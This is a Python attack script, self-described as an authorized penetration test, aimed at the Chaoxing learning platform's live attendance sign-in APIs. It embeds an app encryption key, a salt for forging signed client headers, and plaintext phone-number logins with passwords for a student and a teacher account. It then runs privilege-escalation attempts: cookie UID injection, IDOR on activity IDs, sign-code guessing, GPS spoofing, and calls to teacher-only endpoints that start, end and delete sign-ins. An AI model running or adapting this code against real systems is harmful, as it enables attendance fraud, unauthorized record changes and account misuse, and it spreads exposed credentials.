#!/usr/bin/env python3
"""
Deep Security Audit - mobilelearn.chaoxing.com Sign-in APIs
Authorized penetration test for sign-in API security assessment.
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ CONFIG ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"

MOBILELEARN = "https://mobilelearn.chaoxing.com"
MOOC1_API = "https://mooc1-api.chaoxing.com"

# ============ LOGIN FUNCTIONS ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============ HELPER ============
def safe_request(session, method, url, **kwargs):
    """Safe request wrapper that catches exceptions and returns response info."""
    try:
        resp = session.request(method, url, timeout=30, **kwargs)
        body = ""
        try:
            body = resp.text[:2000]
        except:
            body = "<non-text response>"
        return {
            "status": resp.status_code,
            "body": body,
            "headers": dict(resp.headers),
            "ok": True
        }
    except Exception as e:
        return {
            "status": -1,
            "body": str(e),
            "headers": {},
            "ok": False
        }

def print_result(label, result):
    """Pretty print a test result."""
    print(f"\n  [{label}]")
    if not result["ok"]:
        print(f"    ERROR: {result['body']}")
    else:
        print(f"    Status: {result['status']}")
        body = result['body']
        # Try to parse JSON for cleaner output
        try:
            j = json.loads(body)
            print(f"    Response: {json.dumps(j, ensure_ascii=False, indent=2)[:1500]}")
        except:
            print(f"    Response: {body[:1500]}")

def section(title):
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)

# ============ MAIN ============
def main():
    results = {}

    # ---- Login ----
    section("0. 登录测试账号")
    print("[*] 登录学生账号...")
    stu_sess, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生PUID: {stu_puid}")
    if not stu_puid:
        print("[!] 学生登录失败，退出")
        sys.exit(1)

    print("[*] 登录教师账号...")
    tea_sess, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师PUID: {tea_puid}")
    if not tea_puid:
        print("[!] 教师登录失败，退出")
        sys.exit(1)

    # ================================================================
    # TEST 1: updateSignStatus2 参数暴力测试
    # ================================================================
    section("TEST 1: updateSignStatus2 参数暴力测试")
    endpoint = "/widget/sign/pcTeaSignController/updateSignStatus2"

    params_combos = [
        ("基础参数", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("带denc空", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1", "denc": ""}),
        ("带duid", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1", "duid": stu_puid}),
        ("带denc+duid", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1", "denc": "", "duid": stu_puid}),
        ("教师uid", {"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("教师uid+学生duid", {"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1", "denc": "", "duid": stu_puid}),
        ("带courseId+classId", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("status=5(补签)", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "5"}),
        ("status=0(缺勤)", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "0"}),
        ("status=2(迟到)", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "2"}),
        ("status=3(事假)", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "3"}),
        ("status=4(病假)", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "4"}),
        ("status=6(旷课)", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "6"}),
        ("无uid", {"activeId": ACTIVE_ID, "status": "1"}),
        ("uid=0", {"uid": "0", "activeId": ACTIVE_ID, "status": "1"}),
        ("uid=空", {"uid": "", "activeId": ACTIVE_ID, "status": "1"}),
    ]

    for label, params in params_combos:
        # GET on mobilelearn
        r = safe_request(stu_sess, "GET", f"{MOBILELEARN}{endpoint}", params=params)
        print_result(f"GET mobilelearn | {label}", r)

        # POST on mobilelearn
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint}", data=params)
        print_result(f"POST mobilelearn | {label}", r)

    # POST with JSON Content-Type
    print("\n--- JSON Content-Type 测试 ---")
    for label, params in params_combos[:4]:
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint}",
                         json=params)
        print_result(f"POST JSON mobilelearn | {label}", r)

    # Teacher session for comparison
    print("\n--- 教师Session对比 ---")
    r = safe_request(tea_sess, "GET", f"{MOBILELEARN}{endpoint}",
                     params={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("GET mobilelearn | 教师Session-教师uid", r)

    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}{endpoint}",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("POST mobilelearn | 教师Session-教师uid", r)

    # ================================================================
    # TEST 2: 跨域Cookie对比
    # ================================================================
    section("TEST 2: 跨域Cookie对比 (mobilelearn vs mooc1-api)")

    cross_domain_endpoints = [
        ("/widget/sign/pcTeaSignController/updateSignStatus2",
         {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/pptSign/stuSignajax",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "clientip": "", "latitude": "", "longitude": "", "appType": "", "ifTiJiao": "1", "address": ""}),
        ("/newsign/updateSignStatus",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("/v2/apis/sign/signIn",
         {"activeId": ACTIVE_ID}),
    ]

    for endpoint, params in cross_domain_endpoints:
        print(f"\n--- Endpoint: {endpoint} ---")
        # mobilelearn GET
        r1 = safe_request(stu_sess, "GET", f"{MOBILELEARN}{endpoint}", params=params)
        print_result("GET mobilelearn", r1)

        # mooc1-api GET
        r2 = safe_request(stu_sess, "GET", f"{MOOC1_API}{endpoint}", params=params)
        print_result("GET mooc1-api", r2)

        # mobilelearn POST
        r3 = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint}", data=params)
        print_result("POST mobilelearn", r3)

        # mooc1-api POST
        r4 = safe_request(stu_sess, "POST", f"{MOOC1_API}{endpoint}", data=params)
        print_result("POST mooc1-api", r4)

    # ================================================================
    # TEST 3: updateSignStatusByUidsV2 on mobilelearn
    # ================================================================
    section("TEST 3: updateSignStatusByUidsV2 on mobilelearn")
    endpoint3 = "/pptSign/updateSignStatusByUidsV2"
    params3 = {
        "activeId": ACTIVE_ID,
        "uidList": stu_puid,
        "status": "1",
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
    }

    # Student GET
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}{endpoint3}", params=params3)
    print_result("GET mobilelearn | 学生Session", r)

    # Student POST form
    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint3}", data=params3)
    print_result("POST mobilelearn | 学生Session", r)

    # Student POST JSON
    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint3}", json=params3)
    print_result("POST JSON mobilelearn | 学生Session", r)

    # Student POST no custom headers
    tmp_sess = requests.Session()
    tmp_sess.verify = False
    tmp_sess.cookies.update(stu_sess.cookies)
    r = safe_request(tmp_sess, "POST", f"{MOBILELEARN}{endpoint3}", data=params3)
    print_result("POST mobilelearn | 无自定义UA", r)

    # Compare with mooc1-api
    r = safe_request(stu_sess, "GET", f"{MOOC1_API}{endpoint3}", params=params3)
    print_result("GET mooc1-api | 学生Session", r)

    r = safe_request(stu_sess, "POST", f"{MOOC1_API}{endpoint3}", data=params3)
    print_result("POST mooc1-api | 学生Session", r)

    # Teacher session
    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}{endpoint3}", data={
        "activeId": ACTIVE_ID, "uidList": stu_puid, "status": "1",
        "courseId": COURSE_ID, "classId": CLASS_ID,
    })
    print_result("POST mobilelearn | 教师Session修改学生状态", r)

    # ================================================================
    # TEST 4: stuSignajax 深度测试
    # ================================================================
    section("TEST 4: stuSignajax 深度测试")
    endpoint4 = "/pptSign/stuSignajax"

    # Base params
    base_params = {
        "activeId": ACTIVE_ID,
        "uid": stu_puid,
        "clientip": "",
        "latitude": "",
        "longitude": "",
        "appType": "",
        "ifTiJiao": "1",
        "address": "",
    }

    # Test with signCode
    sign_codes = ["", "1234", "0000", "8888", "6666", "1111", "9999"]
    for code in sign_codes:
        p = dict(base_params)
        p["signCode"] = code
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint4}", data=p)
        print_result(f"POST mobilelearn | signCode={code!r}", r)

    # Test with GPS coordinates
    gps_combos = [
        ("北京", "39.9042", "116.4074"),
        ("上海", "31.2304", "121.4737"),
        ("广州", "23.1291", "113.2644"),
    ]
    for label, lat, lng in gps_combos:
        p = dict(base_params)
        p["latitude"] = lat
        p["longitude"] = lng
        p["address"] = label
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint4}", data=p)
        print_result(f"POST mobilelearn | GPS={label}", r)

    # Test with different signType values
    sign_types = ["0", "1", "2", "3", "4", "5"]
    for st in sign_types:
        p = dict(base_params)
        p["signType"] = st
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint4}", data=p)
        print_result(f"POST mobilelearn | signType={st}", r)

    # Test with objectId (photo sign)
    p = dict(base_params)
    p["objectId"] = "0"
    p["isPhoto"] = "0"
    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint4}", data=p)
    print_result("POST mobilelearn | objectId=0,isPhoto=0", r)

    # Test GET method
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}{endpoint4}", params=base_params)
    print_result("GET mobilelearn | 基础参数", r)

    # Compare with mooc1-api
    r = safe_request(stu_sess, "POST", f"{MOOC1_API}{endpoint4}", data=base_params)
    print_result("POST mooc1-api | 基础参数", r)

    # ================================================================
    # TEST 5: V2 signIn IDOR测试
    # ================================================================
    section("TEST 5: V2 signIn IDOR测试")
    endpoint5 = "/v2/apis/sign/signIn"

    # Normal request
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}{endpoint5}", params={"activeId": ACTIVE_ID})
    print_result("GET mobilelearn | 正常请求", r)

    # POST
    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint5}", data={"activeId": ACTIVE_ID})
    print_result("POST mobilelearn | 正常请求", r)

    # Try with different activeId values (IDOR)
    fake_active_ids = ["1", "9999999999999", "5000163891318", "5000163891320"]
    for aid in fake_active_ids:
        r = safe_request(stu_sess, "GET", f"{MOBILELEARN}{endpoint5}", params={"activeId": aid})
        print_result(f"GET mobilelearn | activeId={aid}", r)

    # Try with courseId and classId params
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}{endpoint5}",
                     params={"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID})
    print_result("GET mobilelearn | 带courseId+classId", r)

    # Try modifying sign-in status through v2 API
    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint5}",
                     json={"activeId": ACTIVE_ID, "status": "1", "uid": stu_puid})
    print_result("POST JSON mobilelearn | 尝试修改status", r)

    # Compare with mooc1-api
    r = safe_request(stu_sess, "GET", f"{MOOC1_API}{endpoint5}", params={"activeId": ACTIVE_ID})
    print_result("GET mooc1-api | 正常请求", r)

    # ================================================================
    # TEST 6: Cookie注入测试
    # ================================================================
    section("TEST 6: Cookie注入测试")

    # Create a copy of student session with teacher UID injected
    inject_sess = requests.Session()
    inject_sess.verify = False
    inject_sess.headers.update(stu_sess.headers)

    # Copy student cookies but inject teacher UID
    for c in stu_sess.cookies:
        inject_sess.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    # Override UID cookies with teacher's
    inject_sess.cookies.set("UID", tea_puid, domain=".chaoxing.com")
    inject_sess.cookies.set("_uid", tea_puid, domain=".chaoxing.com")

    print(f"[*] 注入后Cookie中的UID: {dict((c.name, c.value) for c in inject_sess.cookies if c.name in ('UID','_uid'))}")

    # Test updateSignStatus2 with injected cookies
    r = safe_request(inject_sess, "GET", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     params={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("GET mobilelearn | Cookie注入-教师UID-updateSignStatus2", r)

    r = safe_request(inject_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("POST mobilelearn | Cookie注入-教师UID-updateSignStatus2", r)

    # Test updateSignStatusByUidsV2 with injected cookies
    r = safe_request(inject_sess, "POST", f"{MOBILELEARN}/pptSign/updateSignStatusByUidsV2",
                     data={"activeId": ACTIVE_ID, "uidList": stu_puid, "status": "1",
                           "courseId": COURSE_ID, "classId": CLASS_ID})
    print_result("POST mobilelearn | Cookie注入-教师UID-updateSignStatusByUidsV2", r)

    # Test newsign/updateSignStatus with injected cookies
    r = safe_request(inject_sess, "POST", f"{MOBILELEARN}/newsign/updateSignStatus",
                     data={"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1",
                           "courseId": COURSE_ID, "classId": CLASS_ID})
    print_result("POST mobilelearn | Cookie注入-教师UID-updateSignStatus", r)

    # Also test with student UID in cookies but teacher UID in params
    inject_sess2 = requests.Session()
    inject_sess2.verify = False
    inject_sess2.headers.update(stu_sess.headers)
    for c in stu_sess.cookies:
        inject_sess2.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    r = safe_request(inject_sess2, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("POST mobilelearn | 学生Cookie+教师uid参数-updateSignStatus2", r)

    # ================================================================
    # TEST 7: 全面对比 mobilelearn vs mooc1-api 认证行为
    # ================================================================
    section("TEST 7: 全面对比 mobilelearn vs mooc1-api 认证行为")

    compare_apis = [
        {
            "name": "updateSignStatus2",
            "path": "/widget/sign/pcTeaSignController/updateSignStatus2",
            "params": {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"},
            "method": "GET",
        },
        {
            "name": "updateSignStatus2 POST",
            "path": "/widget/sign/pcTeaSignController/updateSignStatus2",
            "params": {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"},
            "method": "POST",
        },
        {
            "name": "stuSignajax",
            "path": "/pptSign/stuSignajax",
            "params": {"activeId": ACTIVE_ID, "uid": stu_puid, "clientip": "", "latitude": "", "longitude": "", "appType": "", "ifTiJiao": "1", "address": ""},
            "method": "POST",
        },
        {
            "name": "updateSignStatusByUidsV2",
            "path": "/pptSign/updateSignStatusByUidsV2",
            "params": {"activeId": ACTIVE_ID, "uidList": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
            "method": "POST",
        },
        {
            "name": "updateSignStatus (newsign)",
            "path": "/newsign/updateSignStatus",
            "params": {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
            "method": "POST",
        },
        {
            "name": "signIn v2",
            "path": "/v2/apis/sign/signIn",
            "params": {"activeId": ACTIVE_ID},
            "method": "GET",
        },
    ]

    print(f"\n{'API':<35} {'mobilelearn':<30} {'mooc1-api':<30} {'差异?':<5}")
    print("-" * 100)

    for api in compare_apis:
        if api["method"] == "GET":
            r_ml = safe_request(stu_sess, "GET", f"{MOBILELEARN}{api['path']}", params=api["params"])
            r_mo = safe_request(stu_sess, "GET", f"{MOOC1_API}{api['path']}", params=api["params"])
        else:
            r_ml = safe_request(stu_sess, "POST", f"{MOBILELEARN}{api['path']}", data=api["params"])
            r_mo = safe_request(stu_sess, "POST", f"{MOOC1_API}{api['path']}", data=api["params"])

        # Extract key response info
        def extract_key(resp):
            if not resp["ok"]:
                return f"ERROR: {resp['body'][:50]}"
            try:
                j = json.loads(resp["body"])
                if "msg" in j:
                    return f"{resp['status']}|msg={j['msg']}"
                elif "result" in j:
                    return f"{resp['status']}|result={j['result']}"
                elif "error" in j:
                    return f"{resp['status']}|error={j['error']}"
                else:
                    return f"{resp['status']}|{str(j)[:60]}"
            except:
                return f"{resp['status']}|{resp['body'][:60]}"

        ml_key = extract_key(r_ml)
        mo_key = extract_key(r_mo)
        diff = "YES" if ml_key != mo_key else "NO"

        print(f"{api['name']:<35} {ml_key:<30} {mo_key:<30} {diff:<5}")

    # ================================================================
    # ADDITIONAL: Test other potentially interesting endpoints
    # ================================================================
    section("额外测试: 其他签到相关端点")

    extra_endpoints = [
        # Pre-sign info
        ("/pptSign/previewSign", {"activeId": ACTIVE_ID}),
        ("/pptSign/stuSign", {"activeId": ACTIVE_ID, "uid": stu_puid}),
        # Sign details
        ("/newsign/getSignDetail", {"activeId": ACTIVE_ID}),
        ("/widget/sign/pcTeaSignController/getSignDetail", {"activeId": ACTIVE_ID}),
        # Sign list
        ("/newsign/getSignList", {"courseId": COURSE_ID, "classId": CLASS_ID}),
        # Student sign status
        ("/newsign/getStuSignStatus", {"activeId": ACTIVE_ID, "uid": stu_puid}),
        # Start sign (teacher)
        ("/newsign/startSign", {"courseId": COURSE_ID, "classId": CLASS_ID, "signType": "1"}),
        ("/pptSign/startSign", {"courseId": COURSE_ID, "classId": CLASS_ID, "signType": "1"}),
        # End sign (teacher)
        ("/newsign/endSign", {"activeId": ACTIVE_ID}),
        ("/pptSign/endSign", {"activeId": ACTIVE_ID}),
        # Delete sign (teacher)
        ("/newsign/deleteSign", {"activeId": ACTIVE_ID}),
    ]

    for endpoint, params in extra_endpoints:
        # Student on mobilelearn
        r = safe_request(stu_sess, "GET", f"{MOBILELEARN}{endpoint}", params=params)
        print_result(f"GET mobilelearn | 学生 | {endpoint}", r)

        # Student on mooc1-api
        r = safe_request(stu_sess, "GET", f"{MOOC1_API}{endpoint}", params=params)
        print_result(f"GET mooc1-api | 学生 | {endpoint}", r)

    # Teacher on key endpoints
    print("\n--- 教师Session测试关键端点 ---")
    teacher_endpoints = [
        ("/newsign/startSign", {"courseId": COURSE_ID, "classId": CLASS_ID, "signType": "1"}),
        ("/newsign/endSign", {"activeId": ACTIVE_ID}),
        ("/newsign/deleteSign", {"activeId": ACTIVE_ID}),
        ("/widget/sign/pcTeaSignController/getSignDetail", {"activeId": ACTIVE_ID}),
    ]
    for endpoint, params in teacher_endpoints:
        r = safe_request(tea_sess, "POST", f"{MOBILELEARN}{endpoint}", data=params)
        print_result(f"POST mobilelearn | 教师 | {endpoint}", r)

    # ================================================================
    # ADDITIONAL: Test updateSignStatus2 with all known parameter names
    # ================================================================
    section("额外测试: updateSignStatus2 全参数组合")

    # Try adding all possible parameter names that the backend might expect
    full_param_sets = [
        ("完整参数v1", {
            "uid": stu_puid, "activeId": ACTIVE_ID, "status": "1",
            "courseId": COURSE_ID, "classId": CLASS_ID,
            "denc": "", "duid": stu_puid,
        }),
        ("完整参数v2", {
            "uid": stu_puid, "activeId": ACTIVE_ID, "status": "1",
            "courseId": COURSE_ID, "classId": CLASS_ID,
            "denc": "", "duid": stu_puid,
            "studentId": stu_puid, "signId": ACTIVE_ID,
        }),
        ("带chatId", {
            "uid": stu_puid, "activeId": ACTIVE_ID, "status": "1",
            "courseId": COURSE_ID, "classId": CLASS_ID,
            "chatId": CLASS_ID,
        }),
        ("带type参数", {
            "uid": stu_puid, "activeId": ACTIVE_ID, "status": "1",
            "type": "1",
        }),
        ("带source参数", {
            "uid": stu_puid, "activeId": ACTIVE_ID, "status": "1",
            "source": "1",
        }),
    ]

    for label, params in full_param_sets:
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                         data=params)
        print_result(f"POST mobilelearn | {label}", r)

    # ================================================================
    # SUMMARY
    # ================================================================
    section("测试完成 - 结果汇总")
    print("""
[*] 关键发现将在脚本输出中标注。
[*] 重点关注:
    1. updateSignStatus2 是否存在角色检查缺失
    2. mobilelearn 与 mooc1-api 的认证差异
    3. Cookie注入是否可以绕过权限
    4. stuSignajax 是否可通过参数伪造完成签到
    5. v2 signIn 是否存在IDOR漏洞
    6. 其他端点是否存在未授权访问
    """)

if __name__ == "__main__":
    main()
